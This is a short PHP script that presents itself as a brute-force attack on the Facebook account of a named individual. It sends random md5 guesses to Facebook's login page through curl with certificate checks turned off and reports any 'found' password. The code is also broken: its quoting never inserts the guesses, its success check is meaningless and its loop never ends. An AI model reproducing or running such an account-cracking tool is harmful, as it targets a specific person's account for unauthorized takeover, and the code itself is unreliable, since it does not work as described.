<?php
$time = microtime() * 100000;
$username = "charlotte.scheurleer1";
echo "https://twitter.com/LizardL4nds";

while(True)
{     
	$Pass = md5(uniqid(rand(), true));

	if(check_correct($username, $Pass)) {
            echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
    <tr>
        <td>
            <div align='center'><b>Found the password of: ".$Pass."<br> For the account: ".$username."</b></div>
        </td>
    </tr>
</table>
</body>
</html>";
    
}
    echo "<table cellpadding='0' cellspacing='0' boreder='1' align='center' class='raster_table' width='75%'>
    <tr>
        <td>
            <div align='center'><b>Sorry... a password was not found for the account of <span class='alert'>".$username."</span> during the brute for
ce attack.</b></div>
        </td>
    </tr>
</table>";
}
echo "</body>
</html>";
function check_correct($username, $password)
{
	$c = curl_init('https://www.facebook.com/login');
        curl_setopt($c, CURLOPT_HTTPAUTH, CURLAUTH_ANY); // use authentication
        curl_setopt($c, CURLOPT_POST, 1);
        curl_setopt($c, CURLOPT_POSTFIELDS, "email='.$username.'&pass='.$password.'");
        curl_setopt($c, CURLOPT_RETURNTRANSFER, 1); // We need to fetch something from a string, so no direct output!
        curl_setopt($c, CURLOPT_FOLLOWLOCATION, 1); // we get redirected, so follow
        curl_setopt($c, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 2);
        curl_setopt($c, CURLOPT_UNRESTRICTED_AUTH, 0); // always stay authorised
        $str = curl_exec($c); // Get it
        curl_close($c); 
	if($str != "wrong") {return true;}
        else {return false;}
}

echo "NO PASSWORD FOUND"; 
?>
